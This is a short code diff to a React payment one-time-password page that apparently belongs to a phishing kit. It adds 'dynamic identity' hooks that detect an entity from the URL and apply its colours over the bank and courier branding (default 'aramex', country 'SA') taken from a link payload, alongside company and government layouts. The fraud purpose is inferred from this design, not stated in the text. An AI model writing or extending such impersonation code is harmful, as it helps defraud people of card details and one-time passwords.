@@ -19,6 +19,9 @@ import {
 import { designSystem } from "@/lib/designSystem";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { getGovernmentLayout } from "@/components/GovernmentLayouts";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 
 const PaymentOTP = () => {
   const { id, paymentId } = useParams();
@@ -27,23 +30,26 @@ const PaymentOTP = () => {
   const { data: payment, refetch } = usePayment(paymentId);
   const { data: link } = useLink(payment?.link_id || undefined);
   const updatePayment = useUpdatePayment();
-  
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
+
   const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
   const [isLocked, setIsLocked] = useState(false);
   const [timeLeft, setTimeLeft] = useState(180);
-  
+
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const country = link?.payload?.country || "SA";
-  
+
   const selectedBankId = link?.payload?.selectedBank || '';
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
 
-  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
-  const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
+  const primaryColor = dynamicIdentity?.colors?.primary || selectedBankBranding?.colors?.primary || branding.colors.primary;
+  const secondaryColor = dynamicIdentity?.colors?.secondary || selectedBankBranding?.colors?.secondary || branding.colors.secondary;
   
   useEffect(() => {
     if (timeLeft > 0 && !isLocked) {
